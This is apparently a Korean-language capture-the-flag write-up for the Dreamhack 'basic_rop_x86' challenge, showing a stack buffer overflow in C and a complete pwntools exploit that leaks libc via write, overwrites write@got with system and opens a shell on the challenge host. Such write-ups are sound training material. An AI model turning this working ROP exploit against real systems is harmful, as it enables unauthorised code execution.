---
title: Dreamhack wargame basic_rop_x86 write-up
tags: [Dreamhack, pwnable, rop, x86]
style: 
color: 
description: stack 영역에서 발생하는 취약점을 알아보자. 
---

## Code Analysis
---
``` c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```

일반적인 bof 코드이다. buf의 크기는 0x40이지만 입력은 0x400만큼 받는다. <br>그러나 이름이 rop인 만큼 보호기법이 있을 거 같다.
![img1](/assets/basic_rop_x86/1.png)
NX가 켜져있다. 아마 ASLR도 켜져있을 것이다.
<br>

## Vulnerability Analysis
---
익스플로잇을 하기 위한 사전 준비를 해보자.

0. read 함수와 write 함수의 plt와 got를 구하고 pop pop pop ret 가젯을 구한다. 
1. write 함수를 통해 read 함수의 실제 주소를 구한다.
2. 구한 read 함수의 실제 주소로 libc base 주소를 구하고 system 함수의 실제 주소를 구한다.
3. read 함수를 통해 bss 영역에 /bin/sh을 쓴다. 
4. read 함수를 통해 write@got를 system 함수의 주소로 변조한다.
5. write 함수를 실행하여 실질적으로 system("/bin/sh")을 실행시킨다.

버퍼와 ret의 패딩은 72byte임을 gdb를 통해 구하였다. 

## Exploit
---
``` python
from pwn import *

p = remote('host1.dreamhack.games', '14449')
#p = process('./basic_rop_x86')

libc = ELF('./libc.so.6')

read_plt = 0x080483f0
read_got = 0x804a00c
write_plt = 0x08048450
write_got = 0x804a024
bss = 0x0804a040
ret_gadget = 0x8048689

payload = 'A' * 72
payload += p32(write_plt)
payload += p32(ret_gadget)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)

payload += p32(read_plt)
payload += p32(ret_gadget)
payload += p32(0)
payload += p32(bss)
payload += p32(8)

payload += p32(read_plt)
payload += p32(ret_gadget)
payload += p32(0)
payload += p32(write_got)
payload += p32(4)

payload += p32(write_plt)
payload += 'AAAA'
payload += p32(bss)

p.send(payload)

read_addr = u32(p.recvuntil("\xf7")[-4:])
libc_base = read_addr - libc.sym["read"]
system_addr = libc_base + libc.sym["system"]

log.info('libc base : ' + str(hex(libc_base)))
log.info(str(hex(system_addr)))

p.send('/bin/sh\x00')
p.send(p32(system_addr))

p.interactive()
```
![img2](/assets/basic_rop_x86/2.png)
쉘을 획득했다. 

<br>

### Good Game!
E.. too hard